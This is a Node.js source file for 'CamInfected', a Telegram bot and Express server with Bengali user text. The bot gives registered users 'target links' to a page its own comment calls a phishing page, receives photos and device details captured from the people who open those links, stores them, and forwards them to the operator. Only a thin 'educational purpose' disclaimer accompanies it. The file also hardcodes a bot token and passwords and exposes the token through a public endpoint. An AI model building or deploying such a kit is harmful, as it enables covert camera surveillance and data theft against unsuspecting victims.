// 🚀 bot.js – FINAL WORKING VERSION (Railway / Render compatible)
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');

// ------------------- FORCE DATABASE RESET (fresh start every restart) -------------------
const DB_PATH = './caminfected.db';
if (fs.existsSync(DB_PATH)) {
  fs.unlinkSync(DB_PATH);
  console.log('🗑️ Old database deleted – fresh start');
}

// ------------------- CONFIGURATION -------------------
const BOT_TOKEN = '8879628119:AAF_mRJarxire4chz2Q6J353dlSLKaiTHRo';   // Your bot token
const OWNER_CHAT_ID = '8678824835';
const ADMIN_PASSWORD = 'admin@alamin#4045034';
const USER_PASSWORD = 'owner@mrvirus460#alamin';
const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://caminfected-production.up.railway.app';  // Your railway URL

// ------------------- EXPRESS SETUP -------------------
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the HTML page (make sure index.html exists)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/favicon.ico', (req, res) => res.status(204).end());

// ------------------- SQLite DATABASE -------------------
let db;

async function initDatabase() {
  db = await open({ filename: DB_PATH, driver: sqlite3.Database });

  // Users table
  await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      chatId TEXT PRIMARY KEY,
      username TEXT,
      firstName TEXT,
      lastName TEXT,
      isApproved INTEGER DEFAULT 0,
      isBlocked INTEGER DEFAULT 0,
      isAdmin INTEGER DEFAULT 0,
      referralCode TEXT,
      createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
      lastActive DATETIME DEFAULT CURRENT_TIMESTAMP,
      totalLinks INTEGER DEFAULT 0,
      totalPhotos INTEGER DEFAULT 0
    )
  `);

  // Photos table
  await db.exec(`
    CREATE TABLE IF NOT EXISTS photos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      userChatId TEXT,
      photoId TEXT,
      fileId TEXT,
      caption TEXT,
      deviceInfo TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Logs table
  await db.exec(`
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      action TEXT,
      details TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Insert or update owner as admin
  const owner = await db.get('SELECT * FROM users WHERE chatId = ?', [OWNER_CHAT_ID]);
  if (!owner) {
    const crypto = require('crypto');
    const ref = crypto.createHash('md5').update(OWNER_CHAT_ID + Date.now()).digest('hex').substring(0, 10);
    await db.run(
      'INSERT INTO users (chatId, username, firstName, isApproved, isAdmin, referralCode) VALUES (?, ?, ?, 1, 1, ?)',
      [OWNER_CHAT_ID, 'owner', 'Owner', ref]
    );
  } else {
    await db.run('UPDATE users SET isApproved = 1, isAdmin = 1 WHERE chatId = ?', [OWNER_CHAT_ID]);
  }

  console.log('✅ Database ready');
  console.log(`👑 Owner: ${OWNER_CHAT_ID}`);
}

function generateReferralCode(chatId) {
  const crypto = require('crypto');
  return crypto.createHash('md5').update(chatId + Date.now()).digest('hex').substring(0, 10);
}

async function logActivity(chatId, action, details = {}) {
  try {
    await db.run('INSERT INTO logs (chatId, action, details) VALUES (?, ?, ?)',
      [chatId, action, JSON.stringify(details)]);
  } catch (e) {}
}

async function isAdmin(chatId) {
  const user = await db.get('SELECT isAdmin FROM users WHERE chatId = ?', [chatId]);
  return user?.isAdmin === 1;
}

// ------------------- TELEGRAM BOT (polling) -------------------
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Bot started (polling mode)');

// ------------------- COMMAND HANDLERS -------------------

// /start – register user (FIXED: using HTML parse_mode)
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    console.log(`/start called for ${chatId}`);
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) {
      const ref = generateReferralCode(chatId);
      await db.run(
        'INSERT INTO users (chatId, username, firstName, lastName, referralCode) VALUES (?, ?, ?, ?, ?)',
        [chatId, msg.from?.username || '', msg.from?.first_name || '', msg.from?.last_name || '', ref]
      );
      console.log(`New user created: ${chatId}`);
    }

    const welcomeHTML = `
🎉 <b>CamInfected Bot এ স্বাগতম!</b> 🎉

<pre>----------------------------------------</pre>
📸 <b>CamInfected v2.5.7</b>
<pre>----------------------------------------</pre>

⚠️ <b>সতর্কতা:</b> এই সিস্টেম টি সুধু মাএ গবেষণা 👨‍🔬 এবং শিক্ষার উদ্দেশ্য বানানো হয়েছে!  এই সিস্টেম টি ব্যবহার করে কোন প্রোকার খারাপ কাজ করা নিষিদ্ধ 🚫 ডেভলপার কোনো প্রোকার প্রতিকূল পরিস্থিতির জন্য দায়ি নয়!

<pre>----------------------------------------</pre>
🔐 <b>লগইন পাসওয়ার্ড:</b> <code>user password নিতে admin এর সাথে যোগাযোগ করুন! </code>
👑 <b>অ্যাডমিন পাসওয়ার্ড:</b> <code>not for you! </code>

📌 <b>কমান্ড সমূহ:</b>
├─ /login পাসওয়ার্ড – লগইন
├─ /getlink – টার্গেট লিংক
├─ /myphotos – ছবি দেখা
├─ /mystatus – স্ট্যাটাস
└─ /help – সাহায্য

<pre>----------------------------------------</pre>
👨‍💻 Developer: Mohammad Alamin
📱 TikTok: @mr_virus_apk
📨 Telegram: @mrvirus460
`;

    await bot.sendMessage(chatId, welcomeHTML, { parse_mode: 'HTML' });
    console.log(`/start successful for ${chatId}`);
  } catch (err) {
    console.error('Start error details:', err);
    await bot.sendMessage(chatId, '❌ সার্ভার ত্রুটি! আবার চেষ্টা করুন।');
    // Fallback plain text
    try {
      await bot.sendMessage(chatId, '🎉 CamInfected Bot এ স্বাগতম!\n\nদয়া করে আবার /start করুন।');
    } catch (e) {}
  }
});

// /login – user/admin authentication
bot.onText(/\/login (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const password = match[1];
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) return bot.sendMessage(chatId, '❌ প্রথমে /start দিন।');

    if (user.isBlocked) {
      return bot.sendMessage(chatId, '❌ *আপনাকে ব্লক করা হয়েছে!* যোগাযোগ: @mrvirus460', { parse_mode: 'Markdown' });
    }

    if (password === ADMIN_PASSWORD) {
      await db.run('UPDATE users SET isApproved = 1, isAdmin = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
      await logActivity(chatId, 'admin_login');
      await bot.sendMessage(chatId, `✅ *অ্যাডমিন লগইন সফল!*

🔗 *আপনার লিংক:* ${BASE_URL}/?chat_id=${chatId}
👑 *অ্যাডমিন প্যানেল:* /admin
📸 *ছবি দেখতে:* /myphotos`, { parse_mode: 'Markdown' });
    } 
    else if (password === USER_PASSWORD) {
      await db.run('UPDATE users SET isApproved = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
      await logActivity(chatId, 'user_login');
      await bot.sendMessage(chatId, `✅ *লগইন সফল!*

🔗 *আপনার টার্গেট লিংক:* ${BASE_URL}/?chat_id=${chatId}
🔗 *নতুন লিংক:* /getlink
📸 *ছবি দেখতে:* /myphotos`, { parse_mode: 'Markdown' });
    } 
    else {
      await bot.sendMessage(chatId, '❌ *ভুল পাসওয়ার্ড!* যোগাযোগ: @mrvirus460', { parse_mode: 'Markdown' });
      await logActivity(chatId, 'failed_login', { attempt: password });
    }
  } catch (err) {
    console.error('Login error:', err);
    await bot.sendMessage(chatId, '❌ ত্রুটি!');
  }
});

// /getlink – generate target link (ONLY after login)
bot.onText(/\/getlink/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) return bot.sendMessage(chatId, '❌ /start দিন।');
    if (user.isApproved !== 1) {
      return bot.sendMessage(chatId, '❌ *আপনি লগইন করেননি!* /login করুন।', { parse_mode: 'Markdown' });
    }
    if (user.isBlocked) return bot.sendMessage(chatId, '❌ আপনি ব্লক!');

    const link = `${BASE_URL}/?chat_id=${chatId}`;
    await db.run('UPDATE users SET totalLinks = totalLinks + 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
    await logActivity(chatId, 'link_generated');
    await bot.sendMessage(chatId, `🔗 *আপনার টার্গেট লিংক:*\n\`${link}\`\n\n⚠️ শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন।`, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error('Getlink error:', err);
    await bot.sendMessage(chatId, '❌ ত্রুটি!');
  }
});

// /myphotos – show captured photos
bot.onText(/\/myphotos/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user || user.isApproved !== 1) return bot.sendMessage(chatId, '❌ লগইন করুন!');
    if (user.isBlocked) return bot.sendMessage(chatId, '❌ ব্লক!');

    const photos = await db.all('SELECT * FROM photos WHERE userChatId = ? ORDER BY timestamp DESC LIMIT 20', [chatId]);
    if (!photos.length) return bot.sendMessage(chatId, '📸 এখনো কোনো ছবি নেই।');

    await bot.sendMessage(chatId, `📸 *আপনার সর্বশেষ ${photos.length}টি ছবি:*`, { parse_mode: 'Markdown' });
    for (const p of photos) {
      try {
        await bot.sendPhoto(chatId, p.fileId, { caption: `🖼️ ${p.photoId}\n⏰ ${new Date(p.timestamp).toLocaleString('bn-BD')}` });
      } catch (e) {}
    }
  } catch (err) {
    await bot.sendMessage(chatId, '❌ ত্রুটি!');
  }
});

// /mystatus – show user stats
bot.onText(/\/mystatus/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) return bot.sendMessage(chatId, '❌ /start করুন।');
    const stats = {
      totalPhotos: (await db.get('SELECT COUNT(*) as c FROM photos WHERE userChatId = ?', [chatId]))?.c || 0,
      totalLinks: user.totalLinks || 0
    };
    await bot.sendMessage(chatId, `📊 *স্ট্যাটাস*\n✅ স্ট্যাটাস: ${user.isApproved ? 'অ্যাক্টিভ' : 'ইনঅ্যাক্টিভ'}\n👑 অ্যাডমিন: ${user.isAdmin ? 'হ্যাঁ' : 'না'}\n📸 মোট ছবি: ${stats.totalPhotos}\n🔗 মোট লিংক: ${stats.totalLinks}`, { parse_mode: 'Markdown' });
  } catch (err) {}
});

// /help – list commands
bot.onText(/\/help/, async (msg) => {
  const isAdminUser = await isAdmin(msg.chat.id.toString());
  let text = `📌 *কমান্ড লিস্ট*\n/login পাসওয়ার্ড – লগইন\n/getlink – টার্গেট লিংক\n/myphotos – ছবি দেখা\n/mystatus – স্ট্যাটাস\n/help – সাহায্য\n👨‍💻 @mrvirus460`;
  if (isAdminUser) {
    text += `\n\n👑 *অ্যাডমিন কমান্ড*\n/admin – প্যানেল\n/users – ইউজার লিস্ট\n/block [chatId] – ব্লক\n/unblock [chatId] – আনব্লক\n/stats – বিস্তারিত পরিসংখ্যান`;
  }
  await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// ------------------- ADMIN PANEL -------------------
bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return bot.sendMessage(chatId, '❌ আপনি অ্যাডমিন নন!');
  const totalUsers = await db.get('SELECT COUNT(*) as c FROM users');
  const totalPhotos = await db.get('SELECT COUNT(*) as c FROM photos');
  await bot.sendMessage(chatId, `👑 *অ্যাডমিন প্যানেল*\n👥 মোট ইউজার: ${totalUsers.c}\n📸 মোট ছবি: ${totalPhotos.c}\n\n/users – লিস্ট\n/block [id] – ব্লক\n/unblock [id] – আনব্লক`, { parse_mode: 'Markdown' });
});

bot.onText(/\/users/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const users = await db.all('SELECT chatId, firstName, isApproved, isAdmin, isBlocked FROM users ORDER BY createdAt DESC');
  let list = '👥 *ইউজার লিস্ট*\n━━━━━━━━━━━━━━━━━━━━\n';
  for (const u of users) {
    list += `🆔 ${u.chatId}\n👤 ${u.firstName || 'N/A'}\n✅ ${u.isApproved ? '✓' : '✗'} | 👑 ${u.isAdmin ? '✓' : '✗'} | 🔒 ${u.isBlocked ? '🔴' : '⚪'}\n━━━━━━━━━━━━━━━━━━━━\n`;
  }
  await bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
});

bot.onText(/\/block (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const target = match[1];
  await db.run('UPDATE users SET isApproved = 0, isBlocked = 1 WHERE chatId = ?', [target]);
  await bot.sendMessage(chatId, `✅ ব্লক করা হয়েছে: ${target}`);
  await bot.sendMessage(target, `❌ *আপনাকে ব্লক করা হয়েছে!* যোগাযোগ: @mrvirus460`, { parse_mode: 'Markdown' });
});

bot.onText(/\/unblock (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const target = match[1];
  await db.run('UPDATE users SET isApproved = 1, isBlocked = 0 WHERE chatId = ?', [target]);
  await bot.sendMessage(chatId, `✅ আনব্লক করা হয়েছে: ${target}`);
  await bot.sendMessage(target, `✅ *আপনি আনব্লক হয়েছেন!* /login করুন`, { parse_mode: 'Markdown' });
});

bot.onText(/\/stats/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const totalUsers = await db.get('SELECT COUNT(*) as c FROM users');
  const approved = await db.get('SELECT COUNT(*) as c FROM users WHERE isApproved=1');
  const blocked = await db.get('SELECT COUNT(*) as c FROM users WHERE isBlocked=1');
  const photos = await db.get('SELECT COUNT(*) as c FROM photos');
  const today = await db.get("SELECT COUNT(*) as c FROM photos WHERE date(timestamp) = date('now')");
  await bot.sendMessage(chatId, `📊 *বিস্তারিত পরিসংখ্যান*\n👥 মোট ইউজার: ${totalUsers.c}\n✅ অ্যাপ্রুভড: ${approved.c}\n🔴 ব্লকড: ${blocked.c}\n📸 মোট ছবি: ${photos.c}\n📸 আজকের ছবি: ${today.c || 0}`, { parse_mode: 'Markdown' });
});

// ------------------- API ENDPOINTS (for the phishing page) -------------------
app.get('/api/bot-info', (req, res) => {
  res.json({ botToken: BOT_TOKEN, ownerChatId: OWNER_CHAT_ID, baseUrl: BASE_URL });
});

app.post('/api/upload-photo', async (req, res) => {
  const { chatId, photoId, fileId, caption, deviceInfo } = req.body;
  if (!chatId || !photoId || !fileId) return res.status(400).json({ error: 'Missing fields' });

  try {
    await db.run(
      'INSERT INTO photos (chatId, userChatId, photoId, fileId, caption, deviceInfo) VALUES (?, ?, ?, ?, ?, ?)',
      [chatId, chatId, photoId, fileId, caption || '', JSON.stringify(deviceInfo || {})]
    );
    await db.run('UPDATE users SET totalPhotos = totalPhotos + 1 WHERE chatId = ?', [chatId]);
    await bot.sendMessage(OWNER_CHAT_ID, `📸 *নতুন ছবি!*\n🆔 ${chatId}\n📸 ${photoId}\n⏰ ${new Date().toLocaleString('bn-BD')}`, { parse_mode: 'Markdown' });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// ------------------- START SERVER -------------------
async function start() {
  await initDatabase();
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running at ${BASE_URL}`);
    console.log(`🤖 Bot active`);
  });
}

start();